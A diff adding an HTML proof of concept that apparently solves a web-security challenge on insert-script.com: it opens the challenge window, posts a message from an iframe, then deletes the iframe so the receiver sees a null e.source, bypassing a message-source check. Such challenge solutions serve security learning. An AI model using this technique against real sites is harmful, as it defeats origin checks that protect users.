@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<a href=javascript:solve()>CLICK ME<br>
+  <span id=ifr>
+    <iframe></iframe>
+  </span>
+
+<script>
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+  
+async function solve() {
+  let win = window.win = window.open('http://insert-script.com/challenges/challenge1/start.php', '_blank', 'width=500,height=500');
+  
+  await sleep(2000);
+  
+  // Send postMessage from the iframe
+  frames[0].eval("parent.win.postMessage(0xdeadbeef,'*')");
+  
+  // Delete the old iframe
+  // now e.source is null
+  ifr.innerHTML = 'aaabcd';
+}
+     
+</script>
